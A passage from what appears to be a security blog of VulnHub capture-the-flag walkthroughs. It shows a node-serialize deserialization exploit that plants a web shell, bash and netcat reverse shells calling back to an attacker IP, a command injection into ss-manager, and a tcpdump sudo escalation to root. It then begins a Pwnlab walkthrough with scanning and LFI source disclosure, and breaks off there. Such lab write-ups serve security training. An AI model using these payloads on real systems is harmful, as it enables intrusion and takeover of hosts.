<p>If we analyze the exploit code, we need to inject our payload into the cookie value to trigger the execution of commands.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>50036.js 
<span class="c"># Exploit Title: Node.JS - 'node-serialize' Remote Code Execution (3)</span>
<span class="c"># Date: 17.06.2021</span>
<span class="c"># Exploit Author: Beren Kuday GORUN</span>
<span class="c"># Vendor Homepage: https://github.com/luin/serialize</span>
<span class="c"># Software Link: https://github.com/luin/serialize</span>
<span class="c"># Version: 0.0.4</span>
<span class="c"># Tested on: Windows &amp; Ubuntu</span>
<span class="c"># CVE : 2017-5941</span>

var serialize <span class="o">=</span> require<span class="o">(</span><span class="s1">'node-serialize'</span><span class="o">)</span><span class="p">;</span>
var payload <span class="o">=</span> <span class="o">{</span>
    <span class="s2">"webShell"</span> : <span class="s2">"_</span><span class="nv">$$</span><span class="s2">ND_FUNC</span><span class="nv">$$</span><span class="s2">_function(){const http = require('http'); const url = require('url'); const ps  = require('child_process'); http.createServer(function (req, res) { var queryObject = url.parse(req.url,true).query; var cmd = queryObject['cmd']; try { ps.exec(cmd, function(error, stdout, stderr) { res.end(stdout); }); } catch (error) { return; }}).listen(443); }()"</span>
    <span class="o">}</span>
serialize.unserialize<span class="o">(</span>serialize.serialize<span class="o">(</span>payload<span class="o">))</span>

/<span class="k">*</span>
<span class="c"># after being exploited</span>

┌──<span class="o">(</span>root@kali<span class="o">)</span>-[/home/kali]
└─# curl http://10.0.2.4:443?cmd<span class="o">=</span><span class="nb">whoami
</span>nodeadmin
</code></pre></div></div>

<p>We can replicate the exploitation process manually, first we intercept the request with burp, right click and <strong>Send to Repeater</strong>.</p>

<p><img src="/assets/images/templeofdoom/screenshot-3.png" alt="" /></p>

<p>In the repeater tab we click <strong>Send</strong> to have a baseline of the response length, then we copy the cookie value for take it to the burp <strong>Decoder</strong>.</p>

<p><img src="/assets/images/templeofdoom/screenshot-4.png" alt="" /></p>

<p>The cookie set by the server is a base64 encoded JSON object, we need to decode it to URL first and then to base64.</p>

<p><img src="/assets/images/templeofdoom/screenshot-5.png" alt="" /></p>

<p>We copy the payload from the script and base64 encode it.</p>

<p><img src="/assets/images/templeofdoom/screenshot-6.png" alt="" /></p>

<p>In the <strong>Repeater</strong> tab, we paste the resulting string in base64 as the cookie value, then click <strong>Send</strong>, this webshell listens on port 443 waiting for incoming commands via cmd parameter.</p>

<p><img src="/assets/images/templeofdoom/screenshot-7.png" alt="" /></p>

<p>Using curl we can run commands through the cmd parameter.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl http://192.168.179.177:443?cmd<span class="o">=</span><span class="nb">id 
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>nodeadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nodeadmin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>nodeadmin<span class="o">)</span>
</code></pre></div></div>

<p>Then to get a reverse shell we need to set up a netcat listener in this case on port 443 and then execute the following curl request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl http://192.168.179.177:443?cmd<span class="o">=</span><span class="si">$(</span>urlencode <span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"'</span><span class="si">)</span>
</code></pre></div></div>

<p>We have a reverse shell with nodeadmin user privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.177] 38956
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>820<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
<span class="o">[</span>nodeadmin@localhost ~]<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
<span class="o">[</span>nodeadmin@localhost ~]<span class="err">$</span>
</code></pre></div></div>

<p>By listing the procesess <strong>ss-manager</strong> is running as user fireman, googling I found that it is a controller for multi-user management and traffic statistics, also this version is vulnerable to command execution, the exploit can be downloaded <a href="https://www.exploit-db.com/exploits/43006">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>nodeadmin@localhost ~]<span class="nv">$ </span>ps aux | <span class="nb">grep </span>fireman
ps aux | <span class="nb">grep </span>fireman
root       812  0.0  0.8 301464  4420 ?        S    23:41   0:00 su fireman <span class="nt">-c</span> /usr/local/bin/ss-manager
fireman    829  0.0  0.7  37060  3876 ?        Ss   23:41   0:00 /usr/local/bin/ss-manager
nodeadm+  1042  0.0  0.2 213788  1044 ?        S    23:45   0:00 <span class="nb">grep</span> <span class="nt">--color</span><span class="o">=</span>auto fireman
</code></pre></div></div>

<p>According to the specifications of the exploit, this must be run under the UDP port 8833, by listing the servicess we can verify that it is running on the specified port.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>nodeadmin@localhost ~]<span class="nv">$ </span>ss <span class="nt">-ntlu</span>
ss <span class="nt">-ntlu</span>
Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port  
...
udp    UNCONN   0        0               127.0.0.1:8839           0.0.0.0:<span class="k">*</span>     
...
</code></pre></div></div>

<p>On the attacking machine we start a netcat listener on port 1337, then on the victim machine we connect to UDP port 8839 and we run the following command to get a shell from the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>nodeadmin@localhost ~]<span class="nv">$ </span>nc <span class="nt">-v</span> <span class="nt">-u</span> 127.0.0.1 8839
nc <span class="nt">-v</span> <span class="nt">-u</span> 127.0.0.1 8839
Ncat: Version 7.60 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Connected to 127.0.0.1:8839.
add: <span class="o">{</span><span class="s2">"server_port"</span>:8003, <span class="s2">"password"</span>:<span class="s2">"test"</span>, <span class="s2">"method"</span>:<span class="s2">"||bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.179.1/1337 0&gt;&amp;1'||"</span><span class="o">}</span>
</code></pre></div></div>

<p>Now, we have a shell as user fireman.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.1] 52707
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>848<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
<span class="o">[</span>fireman@localhost root]<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>fireman<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>fireman<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>fireman<span class="o">)</span>
<span class="o">[</span>fireman@localhost root]<span class="err">$</span>
</code></pre></div></div>

<p>This user has enabled run some binaries with sudo permissions, we will abuse tcpdump to escalate to root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>fireman@localhost root]<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>fireman on localhost:
    <span class="o">!</span>visiblepw, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS"</span>, env_keep+<span class="o">=</span><span class="s2">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"</span>,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User fireman may run the following commands on localhost:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /sbin/iptables
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/nmcli
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/tcpdump
<span class="o">[</span>fireman@localhost root]<span class="err">$</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>An awesome guide how to exploit this you can find it <a href="https://gtfobins.github.io/gtfobins/tcpdump/#sudo">here</a>.</p>

<p>First we write a reverse shell into a file and give it execution permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>fireman@localhost root]<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'nc 192.168.179.1 8081 -e /bin/bash'</span> <span class="o">&gt;</span> /tmp/r00t
&lt;ho <span class="s1">'nc 192.168.179.1 8081 -e /bin/bash'</span> <span class="o">&gt;</span> /tmp/r00t
<span class="o">[</span>fireman@localhost root]<span class="nv">$ </span><span class="nb">chmod</span> +x /tmp/r00t
<span class="nb">chmod</span> +x /tmp/r00t
</code></pre></div></div>

<p>Then, we set up a netcat listener and run the following command to get a reverse shell as user root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>fireman@localhost root]<span class="nv">$ </span><span class="nb">sudo</span> /usr/sbin/tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> eth0 <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> /tmp/r00t <span class="nt">-Z</span> root
&lt;<span class="nt">-i</span> eth0 <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> /tmp/r00t <span class="nt">-Z</span> root
tcpdump: listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
0 packets dropped by kernel
<span class="o">[</span>fireman@localhost root]<span class="err">$</span>
</code></pre></div></div>

<p>As we can see now we are root and we can read the root flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 8081  
listening on <span class="o">[</span>any] 8081 ...         
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.1] 33895
script <span class="nt">-qc</span> /bin/bash /dev/null                        
<span class="o">[</span>root@localhost ~]#
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@localhost ~]# <span class="nb">ls
ls
</span>flag.txt
<span class="o">[</span>root@localhost ~]# <span class="nb">cat </span>flag.txt
<span class="nb">cat </span>flag.txt
<span class="o">[</span>+] You<span class="s1">'re a soldier.
[+] One of the best that the world could set against
[+] the demonic invasion.

+-----------------------------------------------------------------------------+
| |       |\                                           -~ /     \  /          |
|~~__     | \                                         | \/       /\          /|
|    --   |  \                                        | / \    /    \     /   |
|      |~_|   \                                   \___|/    \/         /      |
|--__  |   -- |\________________________________/~~\~~|    /  \     /     \   |
|   |~~--__  |~_|____|____|____|____|____|____|/ /  \/|\ /      \/          \/|
|   |      |~--_|__|____|____|____|____|____|_/ /|    |/ \    /   \       /   |
|___|______|__|_||____|____|____|____|____|__[]/_|----|    \/       \  /      |
|  \mmmm :   | _|___|____|____|____|____|____|___|  /\|   /  \      /  \      |
|      B :_--~~ |_|____|____|____|____|____|____|  |  |\/      \ /        \   |
|  __--P :  |  /                                /  /  | \     /  \          /\|
|~~  |   :  | /                                 ~~~   |  \  /      \      /   |
|    |      |/                        .-.             |  /\          \  /     |
|    |      /                        |   |            |/   \          /\      |
|    |     /                        |     |            -_   \       /    \    |
+-----------------------------------------------------------------------------+
|          |  /|  |   |  2  3  4  | /~~~~~\ |       /|    |_| ....  ......... |
|          |  ~|~ | % |           | | ~J~ | |       ~|~ % |_| ....  ......... |
|   AMMO   |  HEALTH  |  5  6  7  |  \===/  |    ARMOR    |#| ....  ......... |
+-----------------------------------------------------------------------------+

                FLAG: kre0cu4jl4rzjicpo1i7z5l1

[+] Congratulations on completing this VM &amp; I hope you enjoyed my first boot2root.

[+] You can follow me on twitter: @0katz

[+] Thanks to the homie: @Pink_P4nther
[root@localhost ~]#
</span></code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Pwnlab</h1>
	<p class="post-date text-bold text-upcase">
	<span>December 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Boot2Root virtual machine. Meant to be easy.</p>

<p><strong>Author:</strong> Claor</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/pwnlab-init,158/">https://www.vulnhub.com/entry/pwnlab-init,158/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>A ping sweep on the local network discovered the target machine, the script you can download it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.176 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP/UDP port scan with unicornscan discovered four open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.176:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.176:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
...
TCP open                    http[   80]         from 192.168.179.176  ttl 64 
TCP open                  sunrpc[  111]         from 192.168.179.176  ttl 64 
TCP open                   mysql[ 3306]         from 192.168.179.176  ttl 64 
TCP open                 unknown[55285]         from 192.168.179.176  ttl 64 
...
UDP open                  sunrpc[  111]         from 192.168.179.176  ttl 64
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Service detection and script scanning was performed with nmap against open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p80</span>,111,3306,55285 192.168.179.176 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40121/tcp6  status
|   100024  1          41643/udp   status
|   100024  1          52410/udp6  status
|_  100024  1          55285/tcp   status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 47
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, ConnectWithDatabase, Speaks41ProtocolNew, FoundRows, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsCompression, IgnoreSigpipes, InteractiveClient, ODBCClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, LongColumnFlag, LongPassword, SupportsTransactions, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: tA&amp;9,psoR-<span class="o">(</span>~e^<span class="o">(</span>K~<span class="se">\2</span><span class="c">#</span>
|_  Auth Plugin Name: mysql_native_password
55285/tcp open  status  1 <span class="o">(</span>RPC <span class="c">#100024)</span>
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>The web application has a functionality to upload files, but it requires to be authenticated.</p>

<p><img src="/assets/images/pwnlab/screenshot-1.png" alt="" /></p>

<p>I ran gobuster to discover some interesting file or directory, the only one that catches my attention is the config.php file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.176/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> html,php,txt <span class="nt">-e</span>
...
http://192.168.179.176/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 332]
http://192.168.179.176/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.176/images/]
http://192.168.179.176/login.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 250]                                      
http://192.168.179.176/upload               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.176/upload/]
http://192.168.179.176/upload.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 19]                                       
http://192.168.179.176/config.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]                                        
http://192.168.179.176/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 303]
</code></pre></div></div>

<p>After to enumerate for some time I was able to detect a Local File Inclusion, using wrappers it was possible to read the PHP files, since when including the files of the system of conventional form didn’t obtain results.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.176/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>login
</code></pre></div></div>

<p><img src="/assets/images/pwnlab/screenshot-2.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="local-file-inclusion">Local File Inclusion</h3>

<p>With curl I downloaded the content of the login.php file, we can see that the login form uses prepared queries, reason why SQL Injection wasn’t possible.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.176/?page=php://filter/convert.base64-encode/resource=login"</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'10p'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'PD[^&lt;]*'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tee </span>login.php
&lt;?php
session_start<span class="o">()</span><span class="p">;</span>
require<span class="o">(</span><span class="s2">"config.php"</span><span class="o">)</span><span class="p">;</span>
<span class="nv">$mysqli</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="nv">$server</span>, <span class="nv">$username</span>, <span class="nv">$password</span>, <span class="nv">$database</span><span class="o">)</span><span class="p">;</span>

<span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'user'</span><span class="o">])</span> and isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'pass'</span><span class="o">]))</span>
<span class="o">{</span>
        <span class="nv">$luser</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s1">'user'</span><span class="o">]</span><span class="p">;</span>
        <span class="nv">$lpass</span> <span class="o">=</span> base64_encode<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'pass'</span><span class="o">])</span><span class="p">;</span>

        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$mysqli</span>-&gt;prepare<span class="o">(</span><span class="s2">"SELECT * FROM users WHERE user=? AND pass=?"</span><span class="o">)</span><span class="p">;</span>
        <span class="nv">$stmt</span>-&gt;bind_param<span class="o">(</span><span class="s1">'ss'</span>, <span class="nv">$luser</span>, <span class="nv">$lpass</span><span class="o">)</span><span class="p">;</span>

        <span class="nv">$stmt</span>-&gt;execute<span class="o">()</span><span class="p">;</span>
        <span class="nv">$stmt</span>-&gt;store_Result<span class="o">()</span><span class="p">;</span>

        <span class="k">if</span> <span class="o">(</span><span class="nv">$stmt</span>-&gt;num_rows <span class="o">==</span> 1<span class="o">)</span>
        <span class="o">{</span>
                <span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">'user'</span><span class="o">]</span> <span class="o">=</span> <span class="nv">$luser</span><span class="p">;</span>
                header<span class="o">(</span><span class="s1">'Location: ?page=upload'</span><span class="o">)</span><span class="p">;</span>
        <span class="o">}</span>
        <span class="k">else</span>
        <span class="o">{</span>
                <span class="nb">echo</span> <span class="s2">"Login failed."</span><span class="p">;</span>
        <span class="o">}</span>
<span class="o">}</span>
<span class="k">else</span>
<span class="o">{</span>
        ?&gt;
        &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">""</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"POST"</span><span class="o">&gt;</span>
        &lt;label&gt;Username: &lt;/label&gt;&lt;input <span class="nb">id</span><span class="o">=</span><span class="s2">"user"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"test"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"user"</span><span class="o">&gt;</span>&lt;br /&gt;
        &lt;label&gt;Password: &lt;/label&gt;&lt;input <span class="nb">id</span><span class="o">=</span><span class="s2">"pass"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"pass"</span><span class="o">&gt;</span>&lt;br /&gt;
        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Login"</span><span class="o">&gt;</span>
        &lt;/form&gt;
        &lt;?php
<span class="o">}</span>
</code></pre></div></div>

<p>The upload.php file verifies the image extension through a whitelist, checks the file type, makes sure the “/” isn’t entered trying to add another file type, uses md5 to encrypt the name of the image and attach the extension with which the script was uploaded.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.176/?page=php://filter/convert.base64-encode/resource=upload"</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'10p'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'PD[^&lt;]*'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tee </span>upload.php
&lt;?php
session_start<span class="o">()</span><span class="p">;</span>
<span class="k">if</span> <span class="o">(!</span>isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">'user'</span><span class="o">]))</span> <span class="o">{</span> die<span class="o">(</span><span class="s1">'You must be log in.'</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span>
?&gt;
&lt;html&gt;
        &lt;body&gt;
                &lt;form <span class="nv">action</span><span class="o">=</span><span class="s1">''</span> <span class="nv">method</span><span class="o">=</span><span class="s1">'post'</span> <span class="nv">enctype</span><span class="o">=</span><span class="s1">'multipart/form-data'</span><span class="o">&gt;</span>
                        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s1">'file'</span> <span class="nv">name</span><span class="o">=</span><span class="s1">'file'</span> <span class="nb">id</span><span class="o">=</span><span class="s1">'file'</span> /&gt;
                        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s1">'submit'</span> <span class="nv">name</span><span class="o">=</span><span class="s1">'submit'</span> <span class="nv">value</span><span class="o">=</span><span class="s1">'Upload'</span>/&gt;
                &lt;/form&gt;
        &lt;/body&gt;
&lt;/html&gt;
&lt;?php
<span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'submit'</span><span class="o">]))</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'error'</span><span class="o">]</span> &lt;<span class="o">=</span> 0<span class="o">)</span> <span class="o">{</span>
                <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'name'</span><span class="o">]</span><span class="p">;</span>
                <span class="nv">$filetype</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'type'</span><span class="o">]</span><span class="p">;</span>
                <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s1">'upload/'</span><span class="p">;</span>
                <span class="nv">$file_ext</span>  <span class="o">=</span> strrchr<span class="o">(</span><span class="nv">$filename</span>, <span class="s1">'.'</span><span class="o">)</span><span class="p">;</span>
                <span class="nv">$imageinfo</span> <span class="o">=</span> getimagesize<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'tmp_name'</span><span class="o">])</span><span class="p">;</span>
                <span class="nv">$whitelist</span> <span class="o">=</span> array<span class="o">(</span><span class="s2">".jpg"</span>,<span class="s2">".jpeg"</span>,<span class="s2">".gif"</span>,<span class="s2">".png"</span><span class="o">)</span><span class="p">;</span>

                <span class="k">if</span> <span class="o">(!(</span>in_array<span class="o">(</span><span class="nv">$file_ext</span>, <span class="nv">$whitelist</span><span class="o">)))</span> <span class="o">{</span>
                        die<span class="o">(</span><span class="s1">'Not allowed extension, please upload images only.'</span><span class="o">)</span><span class="p">;</span>
                <span class="o">}</span>

                <span class="k">if</span><span class="o">(</span>strpos<span class="o">(</span><span class="nv">$filetype</span>,<span class="s1">'image'</span><span class="o">)</span> <span class="o">===</span> <span class="nb">false</span><span class="o">)</span> <span class="o">{</span>
                        die<span class="o">(</span><span class="s1">'Error 001'</span><span class="o">)</span><span class="p">;</span>
                <span class="o">}</span>

                <span class="k">if</span><span class="o">(</span><span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">'mime'</span><span class="o">]</span> <span class="o">!=</span> <span class="s1">'image/gif'</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">'mime'</span><span class="o">]</span> <span class="o">!=</span> <span class="s1">'image/jpeg'</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">'mime'</span><span class="o">]</span> <span class="o">!=</span> <span class="s1">'image/jpg'</span><span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">'mime'</span><span class="o">]</span> <span class="o">!=</span> <span class="s1">'image/png'</span><span class="o">)</span> <span class="o">{</span>
                        die<span class="o">(</span><span class="s1">'Error 002'</span><span class="o">)</span><span class="p">;</span>
                <span class="o">}</span>

                <span class="k">if</span><span class="o">(</span>substr_count<span class="o">(</span><span class="nv">$filetype</span>, <span class="s1">'/'</span><span class="o">)&gt;</span>1<span class="o">){</span>
                        die<span class="o">(</span><span class="s1">'Error 003'</span><span class="o">)</span><span class="p">;</span>
                <span class="o">}</span>

                <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="nb">.</span> md5<span class="o">(</span><span class="nb">basename</span><span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'name'</span><span class="o">]))</span>.<span class="nv">$file_ext</span><span class="p">;</span>

                <span class="k">if</span> <span class="o">(</span>move_uploaded_file<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'tmp_name'</span><span class="o">]</span>, <span class="nv">$uploadfile</span><span class="o">))</span> <span class="o">{</span>
                        <span class="nb">echo</span> <span class="s2">"&lt;img src=</span><span class="se">\"</span><span class="s2">"</span>.<span class="nv">$uploadfile</span>.<span class="s2">"</span><span class="se">\"</span><span class="s2">&gt;&lt;br /&gt;"</span><span class="p">;</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                        die<span class="o">(</span><span class="s1">'Error 4'</span><span class="o">)</span><span class="p">;</span>
                <span class="o">}</span>
